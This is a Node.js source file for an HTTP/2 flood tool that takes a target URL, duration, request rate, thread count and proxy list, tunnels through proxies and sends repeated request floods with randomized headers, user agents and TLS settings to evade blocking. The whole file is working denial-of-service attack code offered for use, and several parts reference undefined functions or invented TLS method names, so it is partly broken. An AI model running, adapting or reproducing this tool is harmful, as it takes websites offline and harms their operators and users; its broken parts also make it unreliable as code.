const net = require("net");
const http = require('http');
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');

 lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
]

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7) {
  console.log('node tls target time rate thread proxy'.rainbow);
  process.exit();
}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }

const blackList = ['dbrr.com:https://.site'];

if (blackList.includes(args.target)) {
  console.log("Website Này Nằm Trong Danh Sách Black List.");
  process.exit(1);
}

if (args.time < 0 || args.time > 9999) {
  console.log("Thời Gian Phải Nằm Trong Khoảng Từ 0 Đến 300.");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 9999) {
  console.log("Rate Phải Nằm Trong Khoảng Từ 0 Đến 1024.");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 9999) {
  console.log("Số Threads Phải Nằm Trong Khoảng Từ 0 Đến 256.");
  process.exit(1);
}

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

function readLines(file) {
    return fs.readFileSync(file, 'utf-8').split('\n');
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

// Kiểm tra nếu protocol là 'http:', thì chuyển sang 'https:'
if (parsedTarget.protocol === 'http:') {
    parsedTarget.protocol = 'https:';
}

const targetHost = parsedTarget.host;
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);

} 

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}
    setTimeout(function(){

      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 10 * 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}


function getRandomUserAgent() {
    const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }


  const Header = new NetSocket();
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers[":authority"] = randomString(10) + "." + parsedTarget.host;
  headers["accept"] = randomHeaders['accept'];
  headers["Accept-Encoding"] = "gzip, deflate, br";
  headers["accept-language"] = headerFunc.lang();
  headers["accept-encoding"] = headerFunc.encoding();
  headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
  headers["upgrade-insecure-requests"] = Math.random() > 0.5;
  headers["x-requested-with"] = "XMLHttpRequest";
  headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
  headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";

 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = getRandomUserAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
            echdCurve: ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "rsa_pss_pss_sha384", "GREASE:x25519:secp256r1:secp384r1", "GREASE:X25519:x25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLSv2_method", "TLSv2_1_method", "TLSv2_2_method", "TLSv2_3_method", "TLSv3_method", "TLSv3_1_method", "TLSv3_2_method", "TLSv3_3_method"],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
          };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456 * 10,
            maxHeaderListSize: 262144 * 10,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);